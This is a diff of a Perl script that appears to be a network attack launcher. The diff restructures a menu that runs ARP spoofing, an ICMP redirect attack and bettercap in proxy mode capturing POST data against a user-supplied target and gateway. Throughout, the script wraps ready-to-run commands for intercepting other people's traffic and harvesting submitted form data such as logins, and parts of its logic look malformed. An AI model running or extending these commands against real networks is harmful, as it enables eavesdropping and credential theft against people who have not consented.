@@ -145,19 +145,26 @@ print "[ + ] Do you want to start to follow the log file in real time? (y/n): ";
 # choice selector for arp spoof or blinder
 my $options;
 my $arp;
-            print "[ + ] Option 1 - Start ARP Spoof, type: arpspoof\n [ + ] Option 2 - Start Blinder, type: blinder\n";
-            $options=<STDIN>;
-            chomp($options);
-	    $arp=<STDIN>;
-    	    chomp($arp);
-
-        if ($options eq "arpspoof") 					{
-# start blind traffic hijacker
 my $blindarp;
 my $target;
 my $gateway;
 my $option;
 my $localhost;
+
+            print "[ + ] Option 1 - Start ARP Spoof, type: arpspoof\n [ + ] Option 2 - Start Blinder, type: blinder\n";
+            $options=<STDIN>;
+            chomp($options);
+	    $arp=<STDIN>;
+    	    chomp($arp);
+        if ($options eq "blinder") 					
+{
+
+# start blind traffic hijacker
+#my $blindarp;
+#my $target;
+#my $gateway;
+#my $option;
+#my $localhost;
 $localhost=127.0.0.1;
 print "[ + ] Enter Gateway? (y/n)\n";
     $gateway=<STDIN>;
@@ -179,24 +186,26 @@ print "[ + ] Do you want to start a blind attack? (y/n): ";
 elsif($option eq "2") 						{
                 system ("sudo python ICMPAttack.py -v -i $interface -g $gateway -t $target && bettercap -t $localhost --proxy -P POST"); 
 		      						} 
-elsif($option eq "3") 						{
+else{ if ($option eq "3") 						{
                 system ("sudo bettercap -t $target --proxy -P POST");
-	              						}
-							  }
-elsif($options eq "blinder") 					{
-my $target;
+								}
+    }
+}
+
+
+else {
+	if ($options eq "arpspoof") 				{
+#my $target;
 # start arpspoof; option to spoof a target or spoof the entire network
 print "[ + ] Do you want to spoof a specific target? (y/n): ";
-#    $arp=<STDIN>;
-#    chomp($arp);
+    $arp=<STDIN>;
+    chomp($arp);
         if ($arp eq "y")					{
             print "[ + ] Enter the IP of the Target: \n";
             $target=<STDIN>;
             chomp($target);
                 system ("xterm -e sudo arpspoof -i $interface -t $target $default");
         							}
-        else 							{
-            system ("xterm -e sudo arpspoof -i $interface $default");
-        							}
-}
+								}
+     }
 print color('reset');
